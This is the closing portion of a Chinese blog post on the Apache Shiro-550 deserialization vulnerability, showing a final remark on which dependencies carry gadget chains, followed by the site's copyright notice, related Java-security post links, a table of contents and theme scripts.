<td>看得见 (委派)</td>
<td>看不见 (被隔离)</td>
<td>看得见</td>
</tr>
</tbody></table>
<p><strong>但是但是！！！！</strong></p>
<p><strong>值得注意的是 commons collections 并不是 shiro 自带的依赖，commons BeanUtils 才是，所幸这个依赖也存在反序列化漏洞</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602152257221.png" alt="image-20260215225722109"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://zc-18.github.io/">chuanchuan</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://zc-18.github.io/2026/02/16/shiro550/">https://zc-18.github.io/2026/02/16/shiro550/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://zc-18.github.io/" target="_blank">十七.</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/java%E5%AE%89%E5%85%A8/">java安全</a><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a><a class="post-meta__tags" href="/tags/shiro%E6%BC%8F%E6%B4%9E/">shiro漏洞</a></div><div class="post-share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602101855372.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/02/16/shiro_CB/" title="java安全-CB链"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602101919032.png" onerror="onerror=null;src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">java安全-CB链</div></div><div class="info-2"><div class="info-item-1">java安全中shiro反序列化漏洞，这里主要利用的是shiro自带依赖CommonsBeanutils链路反序列化漏洞</div></div></div></a><a class="pagination-related" href="/2026/02/10/skyDay12/" title="苍穹外卖-DAY12"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512191209.png" onerror="onerror=null;src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">苍穹外卖-DAY12</div></div><div class="info-2"><div class="info-item-1">苍穹外卖课程的第十二天，apachePOI学习，导出数据功能完善，工作台功能接口开发、云服务器打包部署</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/02/16/shiro_CB/" title="java安全-CB链"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602101919032.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-16</div><div class="info-item-2">java安全-CB链</div></div><div class="info-2"><div class="info-item-1">java安全中shiro反序列化漏洞，这里主要利用的是shiro自带依赖CommonsBeanutils链路反序列化漏洞</div></div></div></a><a class="pagination-related" href="/2025/12/13/fanxuliehau/" title="java安全-反序列化"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601010126234.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-13</div><div class="info-item-2">java安全-反序列化</div></div><div class="info-2"><div class="info-item-1">java安全中反序列化初识别部分，java的大部分漏洞都与他有关。</div></div></div></a><a class="pagination-related" href="/2026/01/06/CC1-Chain/" title="java安全-CC1"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602101918834.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-06</div><div class="info-item-2">java安全-CC1</div></div><div class="info-2"><div class="info-item-1">java安全中CC1链，这个链是jdk8u71之前的漏洞，能达到getshell的效果。</div></div></div></a><a class="pagination-related" href="/2026/01/15/CC1_plus-chain/" title="java安全-CC1进阶"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512131205.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-15</div><div class="info-item-2">java安全-CC1进阶</div></div><div class="info-2"><div class="info-item-1">java安全链中的CC1_plus，主要分析了官方ysoserial的LazyMap链，并且研究了jdk8u71版本后CC1失效的原因</div></div></div></a><a class="pagination-related" href="/2026/01/28/CC2-Gadget/" title="java安全-CC2"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602101854084.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-28</div><div class="info-item-2">java安全-CC2</div></div><div class="info-2"><div class="info-item-1">java安全链中的CC2，在CC4逻辑上修改的后半段，没有使用数组的CC链。</div></div></div></a><a class="pagination-related" href="/2026/01/28/CC3-Gadget/" title="java安全-CC3"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/4.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-28</div><div class="info-item-2">java安全-CC3</div></div><div class="info-2"><div class="info-item-1">java安全链中的CC3，使用类加载的方式，实现RCE。</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan2.jpg" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="avatar"/></div><div class="author-info-name">chuanchuan</div><div class="author-info-description">慢吞吞的小孩也会有自己的玫瑰海.</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/zc-18/"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/zc-18/" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://blog.csdn.net/2401_87508420" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="mailto:2890792376@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#java%E5%AE%89%E5%85%A8-shiro-550%E6%BC%8F%E6%B4%9E"><span class="toc-text">java安全-shiro 550漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E9%A1%B9%E7%9B%AE%E6%90%AD%E5%BB%BA"><span class="toc-text">一、项目搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%8E%AF%E5%A2%83"><span class="toc-text">1.环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%90%AD%E5%BB%BA"><span class="toc-text">2.搭建</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81shiro%E5%AD%A6%E4%B9%A0"><span class="toc-text">二、shiro学习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-shiro%E5%8A%9F%E8%83%BD"><span class="toc-text">1.shiro功能</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81"><span class="toc-text">身份认证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%88%E6%9D%83"><span class="toc-text">授权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86"><span class="toc-text">会话管理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86"><span class="toc-text">加密</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-shiro%E4%B8%8EJwt"><span class="toc-text">2.shiro与Jwt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-shiro%E8%BF%9B%E8%A1%8C%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86"><span class="toc-text">3.shiro进行会话管理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E7%9A%84-Session-ID"><span class="toc-text">普通的 Session ID</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%B0%E4%BD%8F%E6%88%91-Cookie"><span class="toc-text">记住我 Cookie</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81shiro550"><span class="toc-text">三、shiro550</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B"><span class="toc-text">1.服务端解密过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8A%A0%E5%AF%86%E8%BF%87%E7%A8%8B"><span class="toc-text">2.加密过程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81payload%E6%9E%84%E9%80%A0"><span class="toc-text">四、payload构造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-URLDNS-%E9%93%BE"><span class="toc-text">1.URLDNS 链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-CC6-%E4%BC%98%E5%8C%96%E9%93%BE"><span class="toc-text">2.CC6 优化链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-shiro%E6%95%B0%E7%BB%84%E9%97%AE%E9%A2%98"><span class="toc-text">3.shiro数组问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-forname%E4%B8%8Eloadclass"><span class="toc-text">4.forname与loadclass</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/02/21/RMI_3/" title="java安全-RMI高版本绕过"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601010125526.png" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="java安全-RMI高版本绕过"/></a><div class="content"><a class="title" href="/2026/02/21/RMI_3/" title="java安全-RMI高版本绕过">java安全-RMI高版本绕过</a><time datetime="2026-02-21T10:00:02.000Z" title="发表于 2026-02-21 18:00:02">2026-02-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/21/RMI_2/" title="java安全-RMI攻击方式"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601010126234.png" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="java安全-RMI攻击方式"/></a><div class="content"><a class="title" href="/2026/02/21/RMI_2/" title="java安全-RMI攻击方式">java安全-RMI攻击方式</a><time datetime="2026-02-21T10:00:01.000Z" title="发表于 2026-02-21 18:00:01">2026-02-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/21/RMI_1/" title="java安全-RMI调用逻辑"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602101854084.png" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="java安全-RMI调用逻辑"/></a><div class="content"><a class="title" href="/2026/02/21/RMI_1/" title="java安全-RMI调用逻辑">java安全-RMI调用逻辑</a><time datetime="2026-02-21T10:00:00.000Z" title="发表于 2026-02-21 18:00:00">2026-02-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/16/shiro_CB/" title="java安全-CB链"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602101919032.png" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="java安全-CB链"/></a><div class="content"><a class="title" href="/2026/02/16/shiro_CB/" title="java安全-CB链">java安全-CB链</a><time datetime="2026-02-16T10:00:10.000Z" title="发表于 2026-02-16 18:00:10">2026-02-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/16/shiro550/" title="java安全-shiro550漏洞"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602101855372.png" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="java安全-shiro550漏洞"/></a><div class="content"><a class="title" href="/2026/02/16/shiro550/" title="java安全-shiro550漏洞">java安全-shiro550漏洞</a><time datetime="2026-02-16T10:00:02.000Z" title="发表于 2026-02-16 18:00:02">2026-02-16</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-flex"></div><div class="footer-other"><div class="footer-copyright"><span class="copyright">© 2025 chuanchuan</span><br/><span class="footer-separator">|</span><span class="footer-slogan">我希望海浪喧嚣，
让我听到我孤独的自由才好</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.3-b2"></script><script src="/js/main.js?v=5.5.3-b2"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@19.1.3/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>(() => {
  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

  window.pjax = new Pjax({
    elements: 'a:not([target="_blank"])',
    selectors: pjaxSelectors,
    cacheBust: false,
    analytics: false,
    scrollRestoration: false
  })

  const triggerPjaxFn = (val) => {
    if (!val) return
    Object.values(val).forEach(fn => {
      try {
        fn()
      } catch (err) {
        console.debug('Pjax callback failed:', err)
      }
    })
  }

  document.addEventListener('pjax:send', () => {
    // removeEventListener
    btf.removeGlobalFnEvent('pjaxSendOnce')
    btf.removeGlobalFnEvent('themeChange')

    // reset readmode
    const $bodyClassList = document.body.classList
    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')

    triggerPjaxFn(window.globalFn.pjaxSend)
  })

  document.addEventListener('pjax:complete', () => {
    btf.removeGlobalFnEvent('pjaxCompleteOnce')
    document.querySelectorAll('script[data-pjax]').forEach(item => {
      const newScript = document.createElement('script')
      const content = item.text || item.textContent || item.innerHTML || ""
      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
      newScript.appendChild(document.createTextNode(content))
      item.parentNode.replaceChild(newScript, item)
    })

    triggerPjaxFn(window.globalFn.pjaxComplete)
  })

  document.addEventListener('pjax:error', e => {
    if (e.request.status === 404) {
      const usePjax = true
      false
        ? (usePjax ? pjax.loadUrl('/404.html') : window.location.href = '/404.html')
        : window.location.href = e.request.responseURL
    }
  })
})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索一下.." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.3-b2"></script></div></div></body></html>